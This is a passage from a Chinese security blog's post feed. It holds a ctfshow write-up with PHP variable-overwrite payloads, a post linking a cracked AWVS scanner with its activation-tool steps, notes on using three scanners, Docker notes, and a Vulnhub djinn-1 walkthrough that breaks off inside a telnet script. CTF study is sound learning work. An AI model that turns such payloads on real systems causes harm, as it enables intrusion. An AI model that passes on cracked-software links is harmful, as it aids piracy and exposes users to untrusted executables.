<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】变量覆盖简单理解 wp</title>
    <url>/posts/165.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="变量覆盖web105"><a href="#变量覆盖web105" class="headerlink" title="变量覆盖web105"></a>变量覆盖web105</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">'你还想要flag嘛？'</span>;</span><br><span class="line">$suces=<span class="string">'既然你想要那给你吧！'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">'error'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'flag'</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"your are good"</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure></div>

<p>这里利用的是变量覆盖，关键点在$$key=$$value，这里把$key的值当作了变量</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">我们传入error&#x3D;flag</span><br><span class="line">$key&#x3D;error</span><br><span class="line">$value&#x3D;flag</span><br><span class="line">$$key&#x3D;$$value就变成了$error&#x3D;$flag，就成功使$flag覆盖了$error</span><br></pre></td></tr></table></figure></div>

<p>所以这里就可以利用变量覆盖进行获取flag</p>
<p>payload</p>
<p><strong>第一种</strong>：</p>
<p>通过$error输出我们的flag，即转入一个gylq的变量接收flag值，然后再第二个循环将gylq的值赋值给error，就可以达到die输出flag了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?gylq&#x3D;flag</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">error&#x3D;gylq</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211003105246548.png" alt="image-20211003105246548"></p>
</blockquote>
<p><strong>第二种：</strong></p>
<p>通过$suces输出我们的flag，即给suces赋值flag，然后第二个循环传入flag为key赋值为空，就可以达到不执行die的目的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?suces&#x3D;flag</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">flag&#x3D;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211003105214621.png" alt="image-20211003105214621"></p>
</blockquote>
<h1 id="变量覆盖web107"><a href="#变量覆盖web107" class="headerlink" title="变量覆盖web107"></a>变量覆盖web107</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">'flag'</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>这题考的是parse_str(string，array)的变量覆盖利用</strong></p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定要解析的字符串。</td>
</tr>
<tr>
<td align="left"><em>array</em></td>
<td align="left">可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</td>
</tr>
</tbody></table>
</blockquote>
<p>举例</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">"name=gylq&amp;age=10"</span>;</span><br><span class="line">parse_str($a,$b);</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">'name'</span>].<span class="string">','</span>.$b[<span class="string">'10'</span>];</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">//gylq,10</span></span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">v3&#x3D;1</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">v1&#x3D;flag&#x3D;c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211003134132996.png" alt="image-20211003134132996"></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】AWVS14.4.2109131破解版下载</title>
    <url>/posts/164.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="AWVS14-4-210913167官网更新日志"><a href="#AWVS14-4-210913167官网更新日志" class="headerlink" title="AWVS14.4.210913167官网更新日志"></a>AWVS14.4.210913167官网更新日志</h2><p><a href="https://www.acunetix.com/support/build-history/" target="_blank" rel="noopener">https://www.acunetix.com/support/build-history/</a></p>
<h2 id="以前版本的更新日志"><a href="#以前版本的更新日志" class="headerlink" title="以前版本的更新日志"></a>以前版本的更新日志</h2><h3 id="适用于-Windows、Linux-和-macOS-的第-14-版-build-14-4-210831180-–-2021-年-9-月-1-日"><a href="#适用于-Windows、Linux-和-macOS-的第-14-版-build-14-4-210831180-–-2021-年-9-月-1-日" class="headerlink" title="适用于 Windows、Linux 和 macOS 的第 14 版 build 14.4.210831180 – 2021 年 9 月 1 日"></a>适用于 Windows、Linux 和 macOS 的第 14 版 build 14.4.210831180 – 2021 年 9 月 1 日</h3><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul>
<li>修正：添加新目标时出错</li>
<li>修复：使用 Postman 导入文件时扫描仪崩溃</li>
</ul>
<h3 id="适用于-Windows、Linux-和-macOS-的版本-14-build-14-4-210826124-–-2021-年-8-月-26-日"><a href="#适用于-Windows、Linux-和-macOS-的版本-14-build-14-4-210826124-–-2021-年-8-月-26-日" class="headerlink" title="适用于 Windows、Linux 和 macOS 的版本 14 build 14.4.210826124 – 2021 年 8 月 26 日"></a>适用于 Windows、Linux 和 macOS 的版本 14 build 14.4.210826124 – 2021 年 8 月 26 日</h3><h4 id="新的漏洞检查"><a href="#新的漏洞检查" class="headerlink" title="新的漏洞检查"></a>新的漏洞检查</h4><ul>
<li><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe" target="_blank" rel="noopener">思科自适应安全设备 (ASA) XSS</a> ( <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-3580" target="_blank" rel="noopener">CVE-2020-3580</a> ) 的新检查</li>
<li>对<a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm" target="_blank" rel="noopener">Jetty 信息披露</a>( <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34429" target="_blank" rel="noopener">CVE-2021-34429</a> ) 的新检查</li>
<li>新检查 SAP ICF URL 重定向漏洞</li>
</ul>
<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><ul>
<li>现在为 Swagger2 模式处理“AllOf”标签</li>
<li>改进了对子域和允许主机的导入文件的处理</li>
</ul>
<h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><ul>
<li>修正：WordPress 检查确定的不存在路径</li>
<li>修复：扫描仪在特定内容上崩溃</li>
</ul>
<h2 id="AWVS14-4-210913167破解版下载地址"><a href="#AWVS14-4-210913167破解版下载地址" class="headerlink" title="AWVS14.4.210913167破解版下载地址"></a>AWVS14.4.210913167破解版下载地址</h2><blockquote>
<p>云中转网盘:<br><a href="https://www.yunzhongzhuan.com/#sharefile=UozQbAMp_12743" target="_blank" rel="noopener">https://www.yunzhongzhuan.com/#sharefile=UozQbAMp_12743</a><br>解压密码: gylq.gitee.io</p>
</blockquote>
<h2 id="AWVS14-4-210913167-正确打开方式-破解方法"><a href="#AWVS14-4-210913167-正确打开方式-破解方法" class="headerlink" title="AWVS14.4.210913167 正确打开方式[破解方法]"></a>AWVS14.4.210913167 正确打开方式[破解方法]</h2><p><strong>千万不要先点击到激活工具[ Acunetix Premium Activation Tool.exe ],否则 重装系统才能重新安装awvs!</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-①卸载旧版awvs</span><br><span class="line">-②重启电脑</span><br><span class="line">-③安装Acunetix Premium v14.4.210816098.exe #安装在默认位置,否则可能激活失败.</span><br><span class="line">-④登录网页</span><br><span class="line">-⑤运行Acunetix Premium Activation Tool.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210930161611989.png" alt="image-20210930161611989"></p>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>AWVS</tag>
        <tag>cracked</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】Medusa被动扫描器使用</title>
    <url>/posts/162.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Medusa漏扫工具"><a href="#Medusa漏扫工具" class="headerlink" title="Medusa漏扫工具"></a>Medusa漏扫工具</h1><blockquote>
<p><a href="https://github.com/Ascotbe/Medusa" target="_blank" rel="noopener">https://github.com/Ascotbe/Medusa</a></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitee.com&#x2F;asc0t6e&#x2F;Medusa.git</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>w13scan</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】Xray被动扫描器使用</title>
    <url>/posts/161.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Xray被动扫描"><a href="#Xray被动扫描" class="headerlink" title="Xray被动扫描"></a>Xray被动扫描</h1><blockquote>
<p>资源我已经发过了，在博客或者微信公众号里面可以看到</p>
</blockquote>
<p>1、启动xray的webscan，接着浏览器中代理，并且将本地的ca证书导入浏览器中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure></div>

<p>导入证书要注意，如果有问题的话，所有都导入一次</p>
<h1 id="Burp和xray联动"><a href="#Burp和xray联动" class="headerlink" title="Burp和xray联动"></a>Burp和xray联动</h1><p>方法一、直接在user option中添加下面截图内容</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210929144724257.png" alt="image-20210929144724257"></p>
</blockquote>
<p>方法二</p>
<p>下载插件Passive Scan Client将流量转发到xray中，用burp，github中下载</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210929145641956.png" alt="image-20210929145641956"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>w13scan</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】w13scan被动扫描器使用</title>
    <url>/posts/160.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="w13scan被动扫描"><a href="#w13scan被动扫描" class="headerlink" title="w13scan被动扫描"></a>w13scan被动扫描</h1><p>1、下载地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;w-digital-scanner&#x2F;w13scan.git</span><br></pre></td></tr></table></figure></div>

<p>2、如果踩坑了，比如安装依赖，百度可解决，缺少什么模块补什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line">cd W13SCAN</span><br></pre></td></tr></table></figure></div>

<p>3、自动化扫描</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3 w13scan.py -s 127.0.0.1:7778 --html</span><br></pre></td></tr></table></figure></div>

<p>4、浏览器用127.0.0.1:7778端口代理http就行了，如果想扫https就加入这个证书，挂代理可以访问，然后加入到浏览器中，就能实时扫描</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;w13scan.ca&#x2F;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210929141640884.png" alt="image-20210929141640884"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>w13scan</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Docker的基本操作和学习</title>
    <url>/posts/159.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Docker的一些命令学习"><a href="#Docker的一些命令学习" class="headerlink" title="Docker的一些命令学习"></a>Docker的一些命令学习</h1><p>1、搜索镜像</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker search --limit 3 ubuntu</span><br></pre></td></tr></table></figure></div>

<p>2、获取镜像</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure></div>

<p>3、查看目前存在的镜像</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></div>

<p>4、删除镜像</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker rmi ID</span><br></pre></td></tr></table></figure></div>

<p>5、创建映射端口为80的交互式界面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker run -tid -p 80:80 -p 3309:3306 -v &#x2F;var&#x2F;www&#x2F;html:&#x2F;var&#x2F;www&#x2F;html --name t1 ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure></div>

<p>6、启动服务和停止服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker stop t1</span><br><span class="line">docker exec -ti t1 &#x2F;bin&#x2F;bash #进入容器bash中</span><br></pre></td></tr></table></figure></div>

<p>7、删除容器和服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)   #停止所有服务</span><br><span class="line">docker rm $(docker ps -a -q) #删除所有服务</span><br><span class="line">docker rmi ID</span><br></pre></td></tr></table></figure></div>

<p>8、改变源</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;docker&#x2F;daemon.json #添加配置文件</span><br><span class="line">在其中添加</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;y0qd3iq.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service docker restart #重启服务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker info|grep Mirrors -A 1 #查看添加的源</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WARNING: Support for cgroup v2 is experimental</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  http:&#x2F;&#x2F;f1361db2.m.daocloud.io&#x2F;</span><br></pre></td></tr></table></figure></div>



<h1 id="二、ubuntu容器的操作"><a href="#二、ubuntu容器的操作" class="headerlink" title="二、ubuntu容器的操作"></a>二、ubuntu容器的操作</h1><p>进入容器</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker exec -ti t1 &#x2F;bin&#x2F;bash #进入容器</span><br><span class="line">docker attach t1  #进入容器</span><br><span class="line"> </span><br><span class="line">apt-get update</span><br><span class="line">apt-get upgrade #更新软件</span><br></pre></td></tr></table></figure></div>

<p>1、配置nginx环境和安装</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt install -y nginx php-fpm mysql-client mysql-server vim</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;php&#x2F;7.4&#x2F;fpm&#x2F;pool.d&#x2F;www.conf</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default  #可以修改一些配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">service php7.4-fpm start</span><br><span class="line">service nginx start #就ok了</span><br></pre></td></tr></table></figure></div>

<p>2、配置mysql</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br><span class="line"></span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure></div>

<h1 id="三、创建镜像"><a href="#三、创建镜像" class="headerlink" title="三、创建镜像"></a>三、创建镜像</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;first commit&quot; -a&#x3D;&quot;gylq&quot; t1 gylq&#x2F;t1</span><br><span class="line"></span><br><span class="line">-a:作者</span><br><span class="line">-m:说明文字</span><br><span class="line"></span><br><span class="line">上传命令</span><br><span class="line">docker push gylq&#x2F;t1</span><br></pre></td></tr></table></figure></div>

<h1 id="四、镜像和容器的导入和导出"><a href="#四、镜像和容器的导入和导出" class="headerlink" title="四、镜像和容器的导入和导出"></a>四、镜像和容器的导入和导出</h1><p>1、镜像的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker save -o gylq_t1.tar gylq&#x2F;t1 #导出</span><br><span class="line">docker save -o .&#x2F;gylq_t1.tar ubuntu:18.04</span><br><span class="line">docker load --input .&#x2F;ubuntu18.tar</span><br></pre></td></tr></table></figure></div>

<p>2、容器的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker export t1 &gt;.&#x2F;web.tar #导出</span><br><span class="line">docker import .&#x2F;web.tar ub</span><br><span class="line"></span><br><span class="line">docker run -tid -p 80:80 -p 3309:3306 -v &#x2F;var&#x2F;www&#x2F;html:&#x2F;var&#x2F;www&#x2F;html --name t2 ub &#x2F;bin&#x2F;bash #使用</span><br><span class="line"></span><br><span class="line">接着用attach进入t2打开服务器</span><br><span class="line">docker attach t2</span><br><span class="line">service mysql start</span><br><span class="line">service nginx start</span><br><span class="line">service php7.4-fpm restart</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机djinn-1</title>
    <url>/posts/166.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="djinn-1开始"><a href="#djinn-1开始" class="headerlink" title="djinn-1开始"></a>djinn-1开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -sV -sC 192.168.56.108 -oA R</span><br><span class="line">.&#x2F;nmapAutomator.sh -H 192.168.56.108 -t recon</span><br></pre></td></tr></table></figure></div>

<p>3、发现1337端口需要通关一个游戏才能获得hint，所以写了个脚本，跑1001次获得提示</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tn = telnetlib.Telnet(<span class="string">'192.168.56.111'</span>,port=<span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'error'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    loop=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> loop&lt;<span class="number">1002</span>:</span><br><span class="line">        data = tn.read_very_eager().decode(<span class="string">"ascii"</span>)</span><br><span class="line">        res = re.search(<span class="string">'(.*?)\n&gt;'</span>,data).group(<span class="number">1</span>)</span><br><span class="line">        datas = str(calc(res))</span><br><span class="line">        print(str(loop)+<span class="string">"[*]"</span>+datas)</span><br><span class="line">        loop=loop+<span class="number">1</span></span><br><span class="line">        tn.write(datas.encode(<span class="string">'ascii'</span>)+<span class="string">b'\n'</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    data = tn.read_very_eager().decode(<span class="string">"ascii"</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(res)</span>:</span></span><br><span class="line">    <span class="comment"># (3, '+', 6)</span></span><br><span class="line">    res_str = res.strip(<span class="string">'('</span>).strip(<span class="string">')'</span>).replace(<span class="string">"'"</span>,<span class="string">""</span>)</span><br><span class="line">    nums = 